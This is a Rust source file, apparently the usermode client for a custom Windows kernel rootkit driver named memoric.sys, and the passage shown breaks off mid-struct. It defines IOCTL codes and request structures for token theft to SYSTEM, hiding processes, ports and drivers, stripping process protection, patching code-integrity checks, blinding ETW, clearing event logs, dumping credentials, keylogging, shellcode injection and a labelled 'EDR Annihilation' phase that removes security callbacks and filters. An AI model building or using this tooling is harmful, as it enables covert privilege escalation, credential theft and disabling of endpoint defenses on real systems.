//! Usermode client for the memoric custom kernel driver
//!
//! Provides type-safe Rust wrappers for all memoric.sys IOCTLs.
//! The embedded driver payload is extracted and ensured automatically when needed.
//! See driver/README.md for driver build and loading instructions.
//!
//! Device path: \\.\Memoric
//!
//! # Example
//! ```no_run
//! let drv = MemoricDriver::open()?;
//! let data = drv.read_physical(0x1000, 256)?;
//! drv.token_steal(4, target_pid)?;
//! ```

use crate::error::MemoricError;
use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_NONE,
    OPEN_EXISTING,
};
use windows::Win32::System::Services::{
    CreateServiceW, DeleteService, OpenSCManagerW, OpenServiceW, StartServiceW,
    SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
    SERVICE_KERNEL_DRIVER,
};
use windows::Win32::System::IO::DeviceIoControl;

const EMBEDDED_DRIVER_BYTES: &[u8] =
    include_bytes!(concat!(env!("CARGO_MANIFEST_DIR"), "/driver/memoric.sys"));

// ================================================================
// IOCTL codes - must match driver/memoric.h exactly
// CTL_CODE(0x8000, Function, METHOD_BUFFERED=0, FILE_ANY_ACCESS=0)
// = (0x8000 << 16) | (0 << 14) | (Function << 2) | 0
// ================================================================

const IOCTL_MEMORIC_PHYS_READ: u32 = 0x80002000;
const IOCTL_MEMORIC_PHYS_WRITE: u32 = 0x80002004;
const IOCTL_MEMORIC_VIRT_READ: u32 = 0x80002008;
const IOCTL_MEMORIC_VIRT_WRITE: u32 = 0x8000200C;
const IOCTL_MEMORIC_GET_CR3: u32 = 0x80002010;
const IOCTL_MEMORIC_GET_EPROCESS: u32 = 0x80002014;
const IOCTL_MEMORIC_TOKEN_STEAL: u32 = 0x80002018;
const IOCTL_MEMORIC_DKOM_HIDE: u32 = 0x8000201C;
const IOCTL_MEMORIC_PPL_REMOVE: u32 = 0x80002020;
const IOCTL_MEMORIC_WRITE_KERNEL: u32 = 0x80002024;
const IOCTL_MEMORIC_VA_TO_PA: u32 = 0x80002028;
const IOCTL_MEMORIC_ENUM_PROCESS: u32 = 0x8000202C;
const IOCTL_MEMORIC_MODULE_HIDE: u32 = 0x80002030;
const IOCTL_MEMORIC_THREAD_HIDE: u32 = 0x80002034;
const IOCTL_MEMORIC_CALLBACK_ENUM: u32 = 0x80002038;
const IOCTL_MEMORIC_CALLBACK_REMOVE: u32 = 0x8000203C;
const IOCTL_MEMORIC_PATCH_KERNEL: u32 = 0x80002040;
const IOCTL_MEMORIC_APC_INJECT: u32 = 0x80002044;
const IOCTL_MEMORIC_HANDLE_STRIP: u32 = 0x80002048;
const IOCTL_MEMORIC_REG_PROTECT: u32 = 0x8000204C;
const IOCTL_MEMORIC_NOTIFY_ROUTINE: u32 = 0x80002050;
const IOCTL_MEMORIC_PE_DUMP: u32 = 0x80002054;
const IOCTL_MEMORIC_SET_DEBUG_PORT: u32 = 0x80002058;
const IOCTL_MEMORIC_DPC_TIMER: u32 = 0x8000205C;
const IOCTL_MEMORIC_PORT_HIDE: u32 = 0x80002060;
const IOCTL_MEMORIC_TOKEN_DUP: u32 = 0x80002064;
const IOCTL_MEMORIC_OBJECT_HOOK: u32 = 0x80002068;
const IOCTL_MEMORIC_DRIVER_STATS: u32 = 0x8000206C;
const IOCTL_MEMORIC_MEMORY_POOL: u32 = 0x80002070;
const IOCTL_MEMORIC_MINIFILTER_ENUM: u32 = 0x80002074;
const IOCTL_MEMORIC_PROCESS_DUMP: u32 = 0x80002078;
const IOCTL_MEMORIC_HYPERVISOR_DETECT: u32 = 0x8000207C;
const IOCTL_MEMORIC_TESTSIGN_HIDE: u32 = 0x80002080;
const IOCTL_MEMORIC_GLOBAL_HOOK: u32 = 0x80002084;
const IOCTL_MEMORIC_AUTO_INJECT: u32 = 0x80002088;
const IOCTL_MEMORIC_INFINITY_HOOK: u32 = 0x8000208C;
const IOCTL_MEMORIC_GET_MODULE_BASE: u32 = 0x80002090;
const IOCTL_MEMORIC_CI_CALLBACK_PATCH: u32 = 0x80002094;
const IOCTL_MEMORIC_CI_FUNC_PATCH: u32 = 0x80002098;
const IOCTL_MEMORIC_PTE_RW: u32 = 0x8000209C;
const IOCTL_MEMORIC_MSR_RW: u32 = 0x800020A0;
const IOCTL_MEMORIC_DRIVER_CLOAK: u32 = 0x800020A4;
const IOCTL_MEMORIC_FORCE_KILL: u32 = 0x800020A8;
const IOCTL_MEMORIC_FORCE_DELETE: u32 = 0x800020AC;
const IOCTL_MEMORIC_SYSTEM_THREAD: u32 = 0x800020B0;
const IOCTL_MEMORIC_KERNEL_EXEC: u32 = 0x800020B4;
const IOCTL_MEMORIC_PPL_BYPASS: u32 = 0x800020B8;
const IOCTL_MEMORIC_CR_RW: u32 = 0x800020BC;
const IOCTL_MEMORIC_IDT_RW: u32 = 0x800020C0;
const IOCTL_MEMORIC_UNLOADED_DRV_CLEAR: u32 = 0x800020C4;
const IOCTL_MEMORIC_TOKEN_SWAP: u32 = 0x800020C8;
const IOCTL_MEMORIC_PROCESS_PROTECT: u32 = 0x800020CC;

/* === Phase 13: Advanced Weaponized Primitives === */
const IOCTL_MEMORIC_KEYLOGGER: u32 = 0x800020D0;
const IOCTL_MEMORIC_REG_HIDE: u32 = 0x800020D4;
const IOCTL_MEMORIC_FILE_LOCK: u32 = 0x800020D8;
const IOCTL_MEMORIC_ETW_BLIND: u32 = 0x800020DC;
const IOCTL_MEMORIC_EPROCESS_SPOOF: u32 = 0x800020E0;
const IOCTL_MEMORIC_EVENT_LOG_CLEAR: u32 = 0x800020E4;
const IOCTL_MEMORIC_CRED_DUMP: u32 = 0x800020E8;
const IOCTL_MEMORIC_DRIVER_IMPERSONATE: u32 = 0x800020EC;
// Phase 14: EDR Annihilation
const IOCTL_MEMORIC_CALLBACK_NUKE: u32 = 0x800020F0;
const IOCTL_MEMORIC_MINIFILTER_DETACH: u32 = 0x800020F4;
const IOCTL_MEMORIC_KERNEL_APC_INJECT: u32 = 0x800020FC;
const IOCTL_MEMORIC_WFP_REMOVE: u32 = 0x80002100;

const MEMORIC_MAX_IO_SIZE: usize = 4 * 1024 * 1024;
const MEMORIC_MAX_FORCE_WRITE: usize = 4096;

const DEVICE_PATH: &str = "\\\\.\\Memoric";
const SERVICE_NAME: &str = "memoric";

// ================================================================
// Request / Response structures - must match driver/memoric.h
// ================================================================

#[repr(C)]
#[derive(Clone, Copy)]
struct PhysRequest {
    physical_address: u64,
    size: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct PhysWriteRequest {
    physical_address: u64,
    size: u32,
    reserved: u32,
    // data follows
}

#[repr(C)]
#[derive(Clone, Copy)]
struct VirtRequest {
    process_id: u32,
    size: u32,
    address: u64,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct VirtWriteRequest {
    process_id: u32,
    size: u32,
    address: u64,
    // data follows
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Cr3Request {
    process_id: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct Cr3Response {
    pub cr3_value: u64,
    pub eprocess_address: u64,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct EprocessRequest {
    process_id: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EprocessInfo {
    pub eprocess_address: u64,
    pub token: u64,
    pub directory_table_base: u64,
    pub unique_process_id: u64,
    pub unique_process_id_off: u32,
    pub active_process_links_off: u32,
    pub token_off: u32,
    pub protection_off: u32,
    pub image_file_name_off: u32,
    pub vad_root_off: u32,
    pub image_file_name: [u8; 16],
}

impl EprocessInfo {
    pub fn image_name(&self) -> String {
        let end = self
            .image_file_name
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(self.image_file_name.len());
        String::from_utf8_lossy(&self.image_file_name[..end]).to_string()
    }
}

#[repr(C)]
#[derive(Clone, Copy)]
struct TokenRequest {
    source_pid: u32,
    target_pid: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct HideRequest {
    process_id: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct PplRequest {
    process_id: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct KernelWriteRequest {
    address: u64,
    size: u32,
    reserved: u32,
    // data follows
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Va2PaRequest {
    process_id: u32,
    reserved: u32,
    virtual_address: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct Va2PaResponse {
    pub physical_address: u64,
}

// ================================================================
// New IOCTL request / response structures
// ================================================================

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ProcessEntry {
    pub process_id: u32,
    pub parent_process_id: u32,
    pub eprocess_address: u64,
    pub token: u64,
    pub directory_table_base: u64,
    pub image_file_name: [u8; 16],
    pub protection: u8,
    pub reserved: [u8; 7],
}

impl ProcessEntry {
    pub fn image_name(&self) -> String {
        let end = self
            .image_file_name
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(self.image_file_name.len());
        String::from_utf8_lossy(&self.image_file_name[..end]).to_string()
    }
}

#[repr(C)]
#[derive(Clone, Copy)]
struct EnumProcessRequest {
    max_entries: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ModuleHideRequest {
    driver_name: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ThreadHideRequest {
    thread_id: u32,
    process_id: u32,
}

pub const CALLBACK_TYPE_PROCESS: u32 = 0;
pub const CALLBACK_TYPE_THREAD: u32 = 1;
pub const CALLBACK_TYPE_IMAGE: u32 = 2;
pub const CALLBACK_TYPE_REGISTRY: u32 = 3;
pub const CALLBACK_TYPE_OBJECT: u32 = 4;

#[repr(C)]
#[derive(Clone, Copy)]
struct CallbackEnumRequest {
    callback_type: u32,
    max_entries: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CallbackEntry {
    pub callback_address: u64,
    pub driver_base: u64,
    pub cookie: u64,
    pub index: u32,
    pub callback_type: u32,
    pub driver_name: [u8; 32],
}

impl CallbackEntry {
    pub fn driver_name_str(&self) -> String {
        let end = self
            .driver_name
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(self.driver_name.len());
        String::from_utf8_lossy(&self.driver_name[..end]).to_string()
    }
}

#[repr(C)]
#[derive(Clone, Copy)]
struct CallbackRemoveRequest {
    callback_type: u32,
    index: u32,
    callback_address: u64,
}

pub const PATCH_TYPE_ETW_TI: u32 = 0;
pub const PATCH_TYPE_DSE: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct PatchKernelRequest {
    patch_type: u32,
    enable: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ApcInjectRequest {
    process_id: u32,
    thread_id: u32,
    shellcode_address: u64,
    shellcode_size: u32,
    reserved: u32,
}

pub const HANDLE_STRIP_PROCESS: u32 = 0;
pub const HANDLE_STRIP_THREAD: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct HandleStripRequest {
    target_pid: u32,
    strip_type: u32,
    access_mask: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct HandleStripResponse {
    pub handles_modified: u32,
    pub reserved: u32,
}

// ── Registry Protection ─────────────────────────────────────────────
pub const REG_PROTECT_ADD: u32 = 0;
pub const REG_PROTECT_REMOVE: u32 = 1;
pub const REG_PROTECT_LIST: u32 = 2;
pub const REG_PROTECT_CLEAR: u32 = 3;

pub const REG_PROTECT_BLOCK_DELETE: u32 = 1;
pub const REG_PROTECT_BLOCK_MODIFY: u32 = 2;
pub const REG_PROTECT_BLOCK_CREATE: u32 = 4;
pub const REG_PROTECT_BLOCK_ALL: u32 = 7;

#[repr(C)]
#[derive(Clone, Copy)]
struct RegProtectRequest {
    action: u32,
    flags: u32,
    key_path: [u16; 256],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RegProtectEntry {
    pub index: u32,
    pub flags: u32,
    pub key_path: [u16; 256],
}

impl RegProtectEntry {
    pub fn key_path_str(&self) -> String {
        let end = self
            .key_path
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(self.key_path.len());
        String::from_utf16_lossy(&self.key_path[..end])
    }
}

// ── Notification Routine ─────────────────────────────────────────────
pub const NOTIFY_PROCESS_CREATE: u32 = 0;
pub const NOTIFY_THREAD_CREATE: u32 = 1;
pub const NOTIFY_IMAGE_LOAD: u32 = 2;

pub const NOTIFY_ACTION_REGISTER: u32 = 0;
pub const NOTIFY_ACTION_UNREGISTER: u32 = 1;
pub const NOTIFY_ACTION_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct NotifyRequest {
    notify_type: u32,
    action: u32,
    max_events: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct NotifyEvent {
    pub event_type: u32,
    pub process_id: u32,
    pub thread_id: u32,
    pub parent_process_id: u32,
    pub image_base: u64,
    pub image_size: u64,
    pub timestamp: u64,
    pub create: u8,
    pub reserved: [u8; 7],
    pub image_name: [u16; 128],
}

impl NotifyEvent {
    pub fn image_name_str(&self) -> String {
        let end = self
            .image_name
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(self.image_name.len());
        String::from_utf16_lossy(&self.image_name[..end])
    }
}

// ── PE Dump ──────────────────────────────────────────────────────────
#[repr(C)]
#[derive(Clone, Copy)]
struct PeDumpRequest {
    process_id: u32,
    reserved: u32,
    base_address: u64,
    max_size: u32,
    reserved2: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PeDumpResponse {
    pub base_address: u64,
    pub image_size: u32,
    pub reserved: u32,
}

// ── Anti-Debug ───────────────────────────────────────────────────────
pub const DEBUG_CLEAR_PORT: u32 = 0;
pub const DEBUG_SET_NO_DEBUG: u32 = 1;
pub const DEBUG_HIDE_FROM_DBG: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct DebugPortRequest {
    process_id: u32,
    action: u32,
}

// ── DPC Timer ────────────────────────────────────────────────────────
pub const DPC_SCHEDULE: u32 = 0;
pub const DPC_CANCEL: u32 = 1;
pub const DPC_QUERY: u32 = 2;
pub const DPC_OP_LOG: u32 = 0;
pub const DPC_OP_HIDE_PROCESS: u32 = 1;
pub const DPC_OP_ESCALATE_TOKEN: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct DpcTimerRequest {
    action: u32,
    timer_index: u32,
    delay_ms: u64,
    target_pid: u32,
    operation: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DpcTimerResponse {
    pub timer_index: u32,
    pub active: u32,
    pub remaining_ms: u64,
    pub fire_count: u32,
    pub reserved: u32,
}

// ── Port Hide ────────────────────────────────────────────────────────
pub const PORT_HIDE_ADD: u32 = 0;
pub const PORT_HIDE_REMOVE: u32 = 1;
pub const PORT_HIDE_LIST: u32 = 2;
pub const PORT_HIDE_CLEAR: u32 = 3;
pub const PORT_PROTOCOL_TCP: u16 = 0;
pub const PORT_PROTOCOL_UDP: u16 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct PortHideRequest {
    action: u32,
    port: u16,
    protocol: u16,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PortHideEntry {
    pub port: u16,
    pub protocol: u16,
}

// ── Token Duplicate ──────────────────────────────────────────────────
pub const TOKEN_DUP_COPY: u32 = 0;
pub const TOKEN_DUP_SYSTEM: u32 = 1;
pub const TOKEN_DUP_RESTORE: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct TokenDupRequest {
    target_pid: u32,
    source_pid: u32,
    action: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct TokenDupResponse {
    pub original_token: u64,
    pub new_token: u64,
    pub target_pid: u32,
    pub source_pid: u32,
}

// ── Object Hook ──────────────────────────────────────────────────────
pub const OBJ_HOOK_REGISTER: u32 = 0;
pub const OBJ_HOOK_UNREGISTER: u32 = 1;
pub const OBJ_HOOK_QUERY: u32 = 2;
pub const OBJ_TYPE_PROCESS: u32 = 0;
pub const OBJ_TYPE_THREAD: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct ObjectHookRequest {
    action: u32,
    object_type: u32,
    protect_pid: u32,
    strip_access: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ObjectHookResponse {
    pub registered: u32,
    pub interception_count: u32,
    pub protected_pid: u32,
    pub stripped_access: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DriverStatsResponse {
    pub total_ioctls: u32,
    pub success_ioctls: u32,
    pub failed_ioctls: u32,
    pub exception_count: u32,
    pub open_handles: u32,
    pub build_number: u32,
    pub driver_version: u32,
    pub offsets_resolved: u32,
    pub notify_process_active: u32,
    pub notify_thread_active: u32,
    pub notify_image_active: u32,
    pub reg_callback_active: u32,
    pub ob_callback_active: u32,
    pub dpc_timers_active: u32,
    pub hidden_port_count: u32,
    pub protected_key_count: u32,
}

// Pool query structures
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PoolQueryRequest {
    pub pool_tag: u32,
    pub max_entries: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PoolEntry {
    pub address: u64,
    pub size: u64,
    pub pool_tag: u32,
    pub pool_type: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PoolQueryResponseHeader {
    pub entry_count: u32,
    pub total_allocations: u32,
}

// Minifilter enumeration structures
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct MinifilterEntry {
    pub filter_name: [u16; 64],
    pub altitude: [u16; 32],
    pub frame_id: u32,
    pub number_of_instances: u32,
    pub flags: u32,
    pub reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct MinifilterResponseHeader {
    pub filter_count: u32,
    pub reserved: u32,
}

// Process dump structures
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ProcessDumpRequest {
    pub process_id: u32,
    pub flags: u32,
    pub base_address: u64,
    pub max_size: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RegionEntry {
    pub base_address: u64,
    pub region_size: u64,
    pub state: u32,
    pub protect: u32,
    pub region_type: u32,
    pub reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ProcessDumpResponseHeader {
    pub region_count: u32,
    pub total_regions: u32,
    pub total_size: u64,
}

// Hypervisor detection structures
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct HypervisorDetectResponse {
    pub hypervisor_present: u32,
    pub hypervisor_type: u32,
    pub vendor_id: [u8; 16],
    pub nesting_level: u32,
    pub timing_anomaly: u32,
    pub msr_anomaly: u32,
    pub idt_anomaly: u32,
    pub cpuid_leaf_count: u32,
    pub reserved: u32,
}

// ── Test Signing Concealment ─────────────────────────────────────────
pub const TESTSIGN_QUERY: u32 = 0;
pub const TESTSIGN_HIDE_SHARED: u32 = 1;
pub const TESTSIGN_HIDE_CI: u32 = 2;
pub const TESTSIGN_RESTORE: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct TestSignRequest {
    action: u32,
    reserved: [u32; 3],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct TestSignResponse {
    pub action: u32,
    pub test_signing_active: u32,
    pub ci_options: u32,
    pub shared_user_patched: u32,
    pub ci_options_address: u64,
    pub shared_user_address: u64,
}

// ── Global Hook ──────────────────────────────────────────────────────
pub const GHOOK_INSTALL: u32 = 0;
pub const GHOOK_REMOVE: u32 = 1;
pub const GHOOK_QUERY: u32 = 2;

pub const GHOOK_TYPE_INLINE: u32 = 0;
pub const GHOOK_TYPE_IAT: u32 = 1;
pub const GHOOK_TYPE_INFINITY: u32 = 2;

pub const MAX_GLOBAL_HOOKS: usize = 16;

#[repr(C)]
#[derive(Clone, Copy)]
struct GlobalHookRequest {
    action: u32,
    hook_type: u32,
    hook_index: u32,
    reserved: u32,
    target_module: [u8; 64],
    target_function: [u8; 64],
    replacement_addr: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GlobalHookEntry {
    pub index: u32,
    pub active: u32,
    pub hook_type: u32,
    pub hit_count: u32,
    pub target_module: [u8; 64],
    pub target_function: [u8; 64],
    pub original_address: u64,
    pub hook_address: u64,
    pub original_bytes: [u8; 16],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GlobalHookResponse {
    pub hook_count: u32,
    pub entries: [GlobalHookEntry; 1],
}

// ── Auto-Inject ──────────────────────────────────────────────────────
pub const AUTOINJECT_ENABLE: u32 = 0;
pub const AUTOINJECT_DISABLE: u32 = 1;
pub const AUTOINJECT_QUERY: u32 = 2;
pub const AUTOINJECT_SET_PAYLOAD: u32 = 3;

pub const AUTOINJECT_FLAG_NTQUERY: u32 = 0x01;
pub const AUTOINJECT_FLAG_ETW: u32 = 0x02;
pub const AUTOINJECT_FLAG_AMSI: u32 = 0x04;
pub const AUTOINJECT_FLAG_CUSTOM: u32 = 0x08;

#[repr(C)]
#[derive(Clone, Copy)]
struct AutoInjectRequest {
    action: u32,
    flags: u32,
    max_payload_size: u32,
    reserved: u32,
    process_filter: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct AutoInjectResponse {
    pub enabled: u32,
    pub flags: u32,
    pub processes_injected: u32,
    pub processes_failed: u32,
    pub processes_skipped: u32,
    pub reserved: u32,
    pub process_filter: [u16; 64],
}

impl AutoInjectResponse {
    pub fn filter_str(&self) -> String {
        let end = self
            .process_filter
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(self.process_filter.len());
        String::from_utf16_lossy(&self.process_filter[..end])
    }
}

// ── Infinity Hook ────────────────────────────────────────────────────
pub const INFHOOK_ENABLE: u32 = 0;
pub const INFHOOK_DISABLE: u32 = 1;
pub const INFHOOK_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct InfinityHookRequest {
    action: u32,
    syscall_number: u32,
    handler_address: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct InfinityHookResponse {
    pub enabled: u32,
    pub syscall_number: u32,
    pub interception_count: u32,
    pub reserved: u32,
    pub get_cpu_clock_addr: u64,
    pub original_handler: u64,
}

// ── Kernel Module Base Query ─────────────────────────────────────────
#[repr(C)]
#[derive(Clone, Copy)]
struct ModuleBaseRequest {
    module_name: [u8; 256],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ModuleBaseResponse {
    pub module_base: u64,
    pub module_size: u32,
    pub found: u32,
}

// ── CI Callback Patch (SeCiCallbacks pointer swap) ───────────────────
pub const CI_CALLBACK_PATCH: u32 = 0;
pub const CI_CALLBACK_RESTORE: u32 = 1;
pub const CI_CALLBACK_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct CiCallbackRequest {
    action: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CiCallbackResponse {
    pub success: u32,
    pub patched: u32,
    pub se_ci_callbacks_addr: u64,
    pub original_ptr: u64,
    pub current_ptr: u64,
    pub zw_flush_addr: u64,
}

// ── CI Function Patch (CiValidateImageHeader prologue patch) ─────────
pub const CI_FUNC_PATCH: u32 = 0;
pub const CI_FUNC_RESTORE: u32 = 1;
pub const CI_FUNC_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct CiFuncPatchRequest {
    action: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CiFuncPatchResponse {
    pub success: u32,
    pub patched: u32,
    pub ci_validate_addr: u64,
    pub original_bytes: [u8; 16],
    pub current_bytes: [u8; 16],
}

// ── PTE Read/Write ────────────────────────────────────────────────────
pub const PTE_READ: u32 = 0;
pub const PTE_WRITE: u32 = 1;
pub const PTE_MAKE_WRITABLE: u32 = 2;
pub const PTE_RESTORE: u32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct PteRequest {
    action: u32,
    reserved: u32,
    virtual_address: u64,
    new_pte_value: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PteResponse {
    pub success: u32,
    pub reserved: u32,
    pub virtual_address: u64,
    pub pte_address: u64,
    pub pte_value: u64,
    pub original_pte_value: u64,
    pub pte_base: u64,
}

// --- MSR R/W ---
pub const MSR_READ: u32 = 0;
pub const MSR_WRITE: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct MsrRequest {
    action: u32,
    msr_index: u32,
    value: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct MsrResponse {
    pub success: u32,
    pub msr_index: u32,
    pub value: u64,
    pub old_value: u64,
}

// --- Driver Cloak ---
pub const CLOAK_SELF: u32 = 0;
pub const CLOAK_TARGET: u32 = 1;
pub const CLOAK_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct DriverCloakRequest {
    action: u32,
    reserved: u32,
    driver_name: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DriverCloakResponse {
    pub success: u32,
    pub cloaked: u32,
    pub driver_object_addr: u64,
    pub driver_section_addr: u64,
    pub entries_removed: u32,
    pub reserved: u32,
}

// --- Force Kill ---
pub const KILL_TERMINATE: u32 = 0;
pub const KILL_DKOM: u32 = 1;
pub const KILL_THREAD_KILL: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct ForceKillRequest {
    action: u32,
    process_id: u32,
    exit_code: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ForceKillResponse {
    pub success: u32,
    pub method: u32,
    pub process_id: u32,
    pub reserved: u32,
    pub eprocess_addr: u64,
}

// --- Force Delete ---
#[repr(C)]
#[derive(Clone, Copy)]
struct ForceDeleteRequest {
    file_path: [u16; 260],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ForceDeleteResponse {
    pub success: u32,
    pub reserved: u32,
    pub nt_status: u64,
}

// --- System Thread ---
pub const THREAD_CREATE: u32 = 0;
pub const THREAD_QUERY: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct SystemThreadRequest {
    action: u32,
    reserved: u32,
    start_address: u64,
    context: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct SystemThreadResponse {
    pub success: u32,
    pub reserved: u32,
    pub thread_handle: u64,
    pub thread_id: u64,
}

// --- Kernel Exec ---
pub const EXEC_RUN: u32 = 0;
pub const EXEC_ALLOC: u32 = 1;
pub const EXEC_FREE: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct KernelExecRequest {
    action: u32,
    shellcode_size: u32,
    allocated_address: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct KernelExecResponse {
    pub success: u32,
    pub reserved: u32,
    pub allocated_address: u64,
    pub return_value: u64,
}

// --- PPL Bypass ---
pub const PPL_STRIP: u32 = 0;
pub const PPL_SET: u32 = 1;
pub const PPL_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct PplBypassRequest {
    action: u32,
    process_id: u32,
    protection_level: u8,
    reserved: [u8; 7],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct PplBypassResponse {
    pub success: u32,
    pub process_id: u32,
    pub eprocess_addr: u64,
    pub old_protection: u8,
    pub new_protection: u8,
    pub reserved: [u8; 6],
}

// --- CR R/W ---
pub const CR_READ: u32 = 0;
pub const CR_WRITE: u32 = 1;

#[repr(C)]
#[derive(Clone, Copy)]
struct CrRequest {
    action: u32,
    cr_index: u32,
    value: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CrResponse {
    pub success: u32,
    pub cr_index: u32,
    pub value: u64,
    pub old_value: u64,
}

// --- IDT R/W ---
pub const IDT_READ: u32 = 0;
pub const IDT_WRITE: u32 = 1;
pub const IDT_DUMP: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct IdtRequest {
    action: u32,
    vector: u32,
    new_handler: u64,
    new_dpl: u16,
    reserved: [u16; 3],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct IdtResponse {
    pub success: u32,
    pub vector: u32,
    pub handler_address: u64,
    pub old_handler_address: u64,
    pub segment: u16,
    pub dpl: u16,
    pub gate_type: u16,
    pub present: u16,
    pub idt_base: u64,
    pub idt_limit: u16,
    pub reserved: [u16; 3],
}

// --- Unloaded Drivers Clear ---
pub const UNLOADED_CLEAR_ALL: u32 = 0;
pub const UNLOADED_CLEAR_NAME: u32 = 1;
pub const UNLOADED_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct UnloadedDrvRequest {
    action: u32,
    reserved: u32,
    driver_name: [u16; 64],
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct UnloadedDrvResponse {
    pub success: u32,
    pub entries_cleared: u32,
    pub total_entries: u32,
    pub reserved: u32,
    pub mm_unloaded_drivers_addr: u64,
}

// --- Token Swap ---
pub const TOKEN_SWAP_STEAL: u32 = 0;
pub const TOKEN_SWAP_SWAP: u32 = 1;
pub const TOKEN_SWAP_QUERY: u32 = 2;

#[repr(C)]
#[derive(Clone, Copy)]
struct TokenSwapRequest {
    action: u32,
    target_pid: u32,
    source_pid: u32,
    reserved: u32,
}

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct TokenSwapResponse {
    pub success: u32,
    pub target_pid: u32,
    pub old_token: u64,
    pub new_token: u64,
